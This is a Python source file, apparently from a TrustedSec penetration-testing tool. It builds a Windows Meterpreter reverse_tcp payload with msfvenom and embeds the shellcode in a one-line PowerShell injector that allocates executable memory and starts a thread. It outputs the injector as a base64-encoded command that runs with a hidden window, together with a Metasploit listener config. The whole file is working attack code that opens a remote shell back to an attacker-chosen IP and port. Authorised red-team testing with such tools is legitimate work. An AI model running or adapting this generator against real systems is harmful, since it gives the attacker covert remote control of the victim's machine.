# Code by https://www.trustedsec.com/

import base64
import re
import subprocess
import sys
from functools import reduce

from utils.metasploit_file import file as metasploit_file


def generate_shellcode(payload, ip, port):
    proc = subprocess.Popen('msfvenom -p {} LHOST={} LPORT={} c'.format(
        payload, ip, port), stdout=subprocess.PIPE, shell=True)
    data = proc.communicate()[0]

    repls = {';': '', ' ': '', '+': '', '"': '', '\n': '', 'buf=': '',
             'Found 0 compatible encoders': '', 'unsignedcharbuf[]=': ''}
    data = reduce(lambda a, kv: a.replace(*kv),
                  iter(repls.items()), data).rstrip()

    return data


def format_payload_powershell(ip, port):
    # payload used for metasploit
    payload = 'windows/meterpreter/reverse_tcp'

    shellcode = generate_shellcode(payload, ip, port)
    shellcode = shellcode.rstrip()

    # sub in x for 0x
    shellcode = re.sub('\\x', '0x', shellcode)

    # base counter
    counter = 0

    # count every four characters then trigger `mesh` and write out data
    mesh = ''

    # ultimate string
    newdata = ''

    for line in shellcode:
        mesh = mesh + line
        counter = counter + 1
        if counter == 4:
            newdata = newdata + mesh + ','
            mesh = ''
            counter = 0

    # here's our shellcode prepared and ready to go
    shellcode = newdata[:-1]

    # one line shellcode injection with native x86 shellcode
    powershell_code = (
        r"""$1 = '$c = ''[DllImport("kernel32.dll")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport("kernel32.dll")]public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);[DllImport("msvcrt.dll")]public static extern IntPtr memset(IntPtr dest, uint src, uint count);'';$w = Add-Type -memberDefinition $c -Name "Win32" -namespace Win32Functions -passthru;[Byte[]];[Byte[]]$sc64 = %s;[Byte[]]$sc = $sc64;$size = 0x1000;if ($sc.Length -gt 0x1000) {$size = $sc.Length};$x=$w::VirtualAlloc(0,0x1000,$size,0x40);for ($i=0;$i -le ($sc.Length-1);$i++) {$w::memset([IntPtr]($x.ToInt32()+$i), $sc[$i], 1)};$w::CreateThread(0,0,$x,0,0,0);for (;;) { Start-sleep 60 };';$goat = [System.Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes($1));if($env:PROCESSOR_ARCHITECTURE -eq "AMD64"){$x86 = $env:SystemRoot + "syswow64WindowsPowerShellv1.0powershell";$cmd = "-noninteractive -EncodedCommand";iex "& $x86 $cmd $goat"}else{$cmd = "-noninteractive -EncodedCommand";iex "& powershell $cmd $goat";}""" % (shellcode))

    powershell = 'powershell -noprofile -windowstyle hidden -noninteractive -EncodedCommand ' + \
        base64.b64encode(powershell_code.encode('utf_16_le'))
    meta_config = metasploit_file(payload, ip, port)

    response = {}

    response['powershell'] = powershell
    response['meta_config'] = meta_config

    return response
